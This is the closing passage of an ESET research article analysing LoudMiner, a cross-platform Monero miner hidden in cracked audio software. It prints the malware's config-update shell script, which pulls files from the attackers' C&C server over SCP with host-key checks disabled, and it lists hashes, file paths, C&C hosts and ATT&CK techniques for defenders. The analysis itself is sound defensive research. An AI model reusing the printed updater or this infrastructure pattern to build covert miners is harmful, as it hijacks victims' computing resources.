<li><span style="font-family: courier new, courier, monospace;">xmrig_update</span> &#8211; updates the configuration of the miner (<span style="font-family: courier new, courier, monospace;">config.json</span>);</li>
<li><span style="font-family: courier new, courier, monospace;">ccommand</span> &#8211; updates <span style="font-family: courier new, courier, monospace;">ccommand_update, xmrig_update</span> (see Script 9), <span style="font-family: courier new, courier, monospace;">updater.sh, xmrig</span>;</li>
<li><span style="font-family: courier new, courier, monospace;">ccommand_update</span> &#8211; updates <span style="font-family: courier new, courier, monospace;">ccommand</span>;</li>
</ul>
<p>From what we have seen, the miner configuration is updated once every day.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f66050019786" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#!/bin/sh
ping -w 40 127.0.0.1
cd /mnt/sda1/tools/bin/ &amp;&amp; scp -P 5100 -C -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null x01@system-update.is:ctrl/cowboinvox`date +%Y%m%d` config.json.new &amp;&amp; mv config.json config.json.bkp &amp;&amp; mv config.json.new config.json</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f66050019786-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f66050019786-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f66050019786-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f66050019786-1"><span class="crayon-p">#!/bin/sh</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f66050019786-2"><span class="crayon-v">ping</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">w</span><span class="crayon-h"> </span><span class="crayon-cn">40</span><span class="crayon-h"> </span><span class="crayon-cn">127.0.0.1</span></div><div class="crayon-line" id="crayon-60a9a94431f66050019786-3"><span class="crayon-v">cd</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">mnt</span><span class="crayon-o">/</span><span class="crayon-v">sda1</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">scp</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">P</span><span class="crayon-h"> </span><span class="crayon-cn">5100</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">C</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">o</span><span class="crayon-h"> </span><span class="crayon-v">StrictHostKeyChecking</span><span class="crayon-o">=</span><span class="crayon-v">no</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">o</span><span class="crayon-h"> </span><span class="crayon-v">UserKnownHostsFile</span><span class="crayon-o">=</span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span><span class="crayon-h"> </span><span class="crayon-v">x01</span><span class="crayon-sy">@</span><span class="crayon-v">system</span><span class="crayon-o">-</span><span class="crayon-v">update</span><span class="crayon-sy">.</span><span class="crayon-st">is</span><span class="crayon-o">:</span><span class="crayon-v">ctrl</span><span class="crayon-o">/</span><span class="crayon-v">cowboinvox</span><span class="crayon-sy">`</span><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-o">%</span><span class="crayon-v">Y</span><span class="crayon-o">%</span><span class="crayon-v">m</span><span class="crayon-o">%</span><span class="crayon-v">d</span><span class="crayon-sy">`</span><span class="crayon-h"> </span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-v">json</span><span class="crayon-sy">.</span><span class="crayon-v">new</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">mv </span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-e">json </span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-v">json</span><span class="crayon-sy">.</span><span class="crayon-v">bkp</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">mv </span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-v">json</span><span class="crayon-sy">.</span><span class="crayon-e">new </span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-v">json</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><em>Script 9. <span style="font-family: courier new, courier, monospace;">xmrig_update</span></em></p>
<p>In order to identify a particular mining session, a file containing the IP address of the machine and the day’s date is created by the <span style="font-family: courier new, courier, monospace;">idgenerator</span> script and its output is sent to the C&amp;C server by the <span style="font-family: courier new, courier, monospace;">updater.sh</span> script.</p>
<h1>Protection</h1>
<p>Obviously, the best advice to be protected against this kind of threat is to not download pirated copies of commercial software. There are, however, some hints that can help you to identify when an application contains unwanted code:</p>
<ul>
<li>A trust popup from an unexpected, “additional” installer (in this case the Oracle network adapter).</li>
<li>High CPU consumption by a process you did not install (QEMU or VirtualBox in this case).</li>
<li>A new service added to the startup services list (Windows) or a new Launch Daemon (macOS).</li>
<li>Network connections to curious domain names (such as system-update[.]info or system-check[.]services here).</li>
</ul>
<h1>Indicators of Compromise (IoCs)</h1>
<h2>Hashes</h2>
<h3>macOS “cracked” applications (versions 1-3)</h3>

<table id="tablepress-706" class="tablepress tablepress-id-706">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">ESET detection name</th><th class="column-4">Version number</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">71030028c4e1b844c85138bd77ddea96a190ec2c</td><td class="column-2">Virtual_DJ_8_Pro_Infinity_macOS.pkg</td><td class="column-3">OSX/LoudMiner.A</td><td class="column-4">1</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">32c80edcec4f7bb3b494e8949c6f2014b7f5db65</td><td class="column-2">Native Instruments Massive Installer.pkg</td><td class="column-3">OSX/LoudMiner.A</td><td class="column-4">1</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">7dc9f8ca07cd8e0247cf15cd8d2da2190a02fc90</td><td class="column-2">Massive_v1.5.5_Installer_macOS.dmg</td><td class="column-3">OSX/LoudMiner.B</td><td class="column-4">2</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">0b40bd0754637d5be2ada760ff0ecfda7afe03d7</td><td class="column-2">Native_Instruments_Effects_Series_Mod_Pack.dmg</td><td class="column-3">OSX/LoudMiner.B</td><td class="column-4">2</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">88efc767a32299e922f1b41f82c8d584585e2161</td><td class="column-2">Spectrasonics_Omnisphere_2.5_OSx.dmg</td><td class="column-3">OSX/LoudMiner.C</td><td class="column-4">3</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">e9c9d17d006fb03d67b736c0826df0af8ca6d5fd</td><td class="column-2">Lennar_Digital_Sylenth1_2.2.1.dmg</td><td class="column-3">OSX/LoudMiner.C</td><td class="column-4">3</td>
</tr>
</tbody>
</table>

<h3>Windows “cracked” applications (version 4)</h3>

<table id="tablepress-707" class="tablepress tablepress-id-707">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">ESET detection name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">23faacfc23cfef65504d7fa20854030b96a9df91</td><td class="column-2">Ableton.Live.Suite.10.0.6.Multilingual.x64.WIN.zip</td><td class="column-3">Win32/LoudMiner.A</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">5a8682eae69b2e11d45980941a972bd734630207</td><td class="column-2">Infected-Mushroom-Manipulator-V1.0.3.zip</td><td class="column-3">Win32/LoudMiner.A</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">60a8f1d4a028153271093e815e8267bd25fde852</td><td class="column-2">Sonic_Academy_ANA_2.0.3_x86_x64.msi</td><td class="column-3">Win32/LoudMiner.A</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">7c7876058783da85d5502b9406f7fb4d26f66238</td><td class="column-2">SoundToys_5.0.1_x64-SetupFiles.rar</td><td class="column-3">Win32/LoudMiner.A</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">a1a1dc7876d71749a8bc5690c537451770ef4ab8</td><td class="column-2">Valhalla-DSP-Full-Bundle-setupfiles.zip</td><td class="column-3">Win32/LoudMiner.A</td>
</tr>
</tbody>
</table>

<h3>Linux images</h3>

<table id="tablepress-708" class="tablepress tablepress-id-708">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">Version number</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">dd9b89a3c5a88fb679f098e2c2847d22350e23b1</td><td class="column-2">sys00_1-disk001.qcow2</td><td class="column-3">1</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">d1e42e913da308812dd8da1601531b197c1a09a1</td><td class="column-2">sys00_1-disk001.qcow2</td><td class="column-3">1</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">39a7e86368f0e68a86cce975fd9d8c254a86ed93</td><td class="column-2">z1.qcow2 (renamed with a randomized name)</td><td class="column-3">2</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">59026ffa1aa7b60e5058a0795906d107170b9e0f</td><td class="column-2">z1.qcow2 (renamed with a randomized name)</td><td class="column-3">3</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">fcf5c3b560295ee330b97424b7354fd321757cc6</td><td class="column-2">sys00_1.ova</td><td class="column-3">4</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">fc60431a0172d5b8cf4b34866567656467cf861c</td><td class="column-2">sys00_1.ova</td><td class="column-3">4</td>
</tr>
</tbody>
</table>

<h2>Filenames</h2>
<h3>macOS</h3>
<ul>
<li>/Library/Application Support/.Qemusys</li>
<li>/Library/Application Support/.System-Monitor</li>
<li>/usr/local/bin/{.Tools-Service, cpumonitor, system-monitor, tools-service}</li>
<li>/Library/LaunchDaemons/{com.buildtools.system-monitor.plist, com.buildtools.tools-service.plist, com.modulesys.qemuservice.plist, com.systools.cpumonitor.plist}</li>
</ul>
<h3>Windows</h3>
<ul>
<li>C:\vms</li>
</ul>
<h2>Hostnames</h2>
<p>vstcrack[.]com (137[.]74.151.144)</p>
<h3>Download hosts (via HTTP on port 80)</h3>
<ul>
<li>185[.]112.156.163</li>
<li>185[.]112.156.29</li>
<li>185[.]112.156.70</li>
<li>185[.]112.157.102</li>
<li>185[.]112.157.103</li>
<li>185[.]112.157.105</li>
<li>185[.]112.157.12</li>
<li>185[.]112.157.181</li>
<li>185[.]112.157.213</li>
<li>185[.]112.157.24</li>
<li>185[.]112.157.38</li>
<li>185[.]112.157.49</li>
<li>185[.]112.157.53</li>
<li>185[.]112.157.65</li>
<li>185[.]112.157.72</li>
<li>185[.]112.157.79</li>
<li>185[.]112.157.85</li>
<li>185[.]112.157.99</li>
<li>185[.]112.158.112</li>
<li>185[.]112.158.133</li>
<li>185[.]112.158.186</li>
<li>185[.]112.158.190</li>
<li>185[.]112.158.20</li>
<li>185[.]112.158.3</li>
<li>185[.]112.158.96</li>
<li>d-d[.]host (185[.]112.158.44)</li>
<li>d-d[.]live (185[.]112.156.227)</li>
<li>d-d[.]space (185[.]112.157.79)</li>
<li>m-m[.]icu (185[.]112.157.118)</li>
</ul>
<h3>Update hosts (via SCP)</h3>
<ul>
<li>aly001[.]hopto.org (192[.]210.200.87, port 22)</li>
<li>system-update[.]is (145[.]249.104.109, port 5100)</li>
</ul>
<h3>Mining hosts</h3>
<ul>
<li>system-update[.]info (185[.]193.126.114, port 443 or 8080)</li>
<li>system-check[.]services (82[.]221.139.161, port 8080)</li>
</ul>
<h1>MITRE ATT&amp;CK techniques</h1>

<table id="tablepress-709" class="tablepress tablepress-id-709">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1035/" rel="noopener" target="_blank">T1035</a></td><td class="column-3">Service Execution</td><td class="column-4">On Windows, the Linux image is run as a service with VboxVmService.</td>
</tr>
<tr class="row-3 odd">
	<td rowspan="3" class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1050/" rel="noopener" target="_blank">T1050</a></td><td class="column-3">New Service</td><td class="column-4">Install the Linux virtual machine as a service with VboxVmService.</td>
</tr>
<tr class="row-4 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1062/" rel="noopener" target="_blank">T1062</a></td><td class="column-3">Hypervisor</td><td class="column-4">Install a type-2 hypervisor on the host (VirtualBox or QEMU) to run the miner.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1160/" rel="noopener" target="_blank">T1160</a></td><td class="column-3">Launch Daemon</td><td class="column-4">The macOS versions use a Launch Daemon to ensure the persistence.</td>
</tr>
<tr class="row-6 even">
	<td rowspan="3" class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1027/" rel="noopener" target="_blank">T1027</a></td><td class="column-3">Obfuscated Files or Information</td><td class="column-4">Some shell scripts are obfuscated, and some installers are encrypted in macOS versions.</td>
</tr>
<tr class="row-7 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1045/" rel="noopener" target="_blank">T1045</a></td><td class="column-3">Software Packing</td><td class="column-4">Use <a href="https://bat2exe.net/" rel="noopener" target="_blank">BAT2EXE </a>to pack batch script in Windows versions.</td>
</tr>
<tr class="row-8 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1158/" rel="noopener" target="_blank">T1158</a></td><td class="column-3">Hidden Files and Directories</td><td class="column-4">The VirtualBox installation folder and the directory containing the Linux image are hidden.</td>
</tr>
<tr class="row-9 odd">
	<td rowspan="2" class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1043/" rel="noopener" target="_blank">T1043</a></td><td class="column-3">Commonly Used Port</td><td class="column-4">Use TCP ports 443 and 8080 for mining pool communication.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1105/" rel="noopener" target="_blank">T1105</a></td><td class="column-3">Remote File Copy</td><td class="column-4">Use SCP (port 22 or 5100) to copy files from/to the C&amp;C server.</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">Impact</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1496/" rel="noopener" target="_blank">T1496</a></td><td class="column-3">Resource Hijacking</td><td class="column-4">Use victim machines to mine cryptocurrency (Monero).</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mmalik/" title="Michal Malik">
                    Michal Malik                </a>
            </div>
        </div>
                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2019-06-20 11:00:32">20 Jun 2019 - 11:00AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="NEWSLETTER" value="We Live Security">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button>
						Submit					</button>
				</div>
			</form>
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybersecurity/" class="category-tag-btn">Cybersecurity</a>                                                <a href="https://www.welivesecurity.com/2021/05/12/eset-research-rsa-conference-2021-presentations/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/05/eset-research-rsa2021-conference-preview-623x415.jpg"
                                                         alt="LoudMiner: Cross&#8209;platform mining in cracked VST software">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/05/12/eset-research-rsa-conference-2021-presentations/">
                                                    ESET Research goes to RSA Conference 2021 with two presentations                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/05/05/ousaban-private-photo-collection-hidden-cabinet/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/05/ousaban-banking-trojan-brazil-eset-research-623x415.jpg"
                                                         alt="LoudMiner: Cross&#8209;platform mining in cracked VST software">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/05/05/ousaban-private-photo-collection-hidden-cabinet/">
                                                    Ousaban: Private photo collection hidden in a CABinet                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/04/14/fbi-removes-malware-compromised-exchange-servers/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/04/fbi-removing-malware-exchange-server-623x415.jpg"
                                                         alt="LoudMiner: Cross&#8209;platform mining in cracked VST software">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/04/14/fbi-removes-malware-compromised-exchange-servers/">
                                                    FBI removes web shells from compromised Exchange servers                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/04/lazarus-vyveva-backdoor-south-africa-623x432.jpg"
                                                         alt="LoudMiner: Cross&#8209;platform mining in cracked VST software">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/">
                                                    (Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy Policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F06%2F20%2Floudminer-mining-cracked-vst-software%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F06%2F20%2Floudminer-mining-cracked-vst-software%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F06%2F20%2Floudminer-mining-cracked-vst-software%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.2.0.adc7d1ec.pro-awus -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
